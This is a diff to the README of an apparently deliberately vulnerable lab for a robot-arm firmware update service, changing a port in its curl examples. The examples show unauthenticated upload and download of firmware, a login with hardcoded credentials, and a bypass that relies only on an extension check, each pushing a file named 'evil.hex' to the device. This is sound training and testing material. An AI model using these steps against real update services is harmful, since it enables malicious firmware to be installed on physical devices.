@@ -102,27 +102,27 @@ Cloud endpoints:
 ```bash
 # --- v0: unauthenticated upload ---
 # Upload any file; the cloud server replaces the Pi firmware path.
-curl -s -X PUT -F 'file=@evil.hex' http://localhost:5003/api/v0/firmware
+curl -s -X PUT -F 'file=@evil.hex' http://localhost:5002/api/v0/firmware
 # -> {"version": "v0", "filename": "robot_arm.hex", "path": "/app/firmware/robot_arm.hex", "pushed": true}
 
 # Download the current firmware image without authentication.
-curl -s http://localhost:5003/api/v0/firmware -o current.hex
+curl -s http://localhost:5002/api/v0/firmware -o current.hex
 
 # --- v2: session-gated upload with extension check only ---
 # Login first to obtain the session cookie.
-curl -s -c cookies.txt -X POST http://localhost:5003/login \
+curl -s -c cookies.txt -X POST http://localhost:5002/login \
      -d 'username=operator&password=octobot'
 
 # Upload a .hex file; it is pushed to the Pi.
-curl -s -b cookies.txt -X PUT -F 'file=@evil.hex' http://localhost:5003/api/v2/firmware
+curl -s -b cookies.txt -X PUT -F 'file=@evil.hex' http://localhost:5002/api/v2/firmware
 # -> {"version": "v2", "filename": "robot_arm.hex", "path": "/app/firmware/robot_arm.hex", "pushed": true}
 
 # Upload a non-.hex file; rejected by the extension filter.
-curl -s -w '%{http_code}' -b cookies.txt -X PUT -F 'file=@evil.bin' http://localhost:5003/api/v2/firmware
+curl -s -w '%{http_code}' -b cookies.txt -X PUT -F 'file=@evil.bin' http://localhost:5002/api/v2/firmware
 # -> 400 {"error": "only .hex files are allowed"}
 
 # Without a session cookie, v2 returns 401.
-curl -s -w '%{http_code}' -X PUT -F 'file=@evil.hex' http://localhost:5003/api/v2/firmware
+curl -s -w '%{http_code}' -X PUT -F 'file=@evil.hex' http://localhost:5002/api/v2/firmware
 # -> 401
 
 # --- Static analysis of the firmware image ---
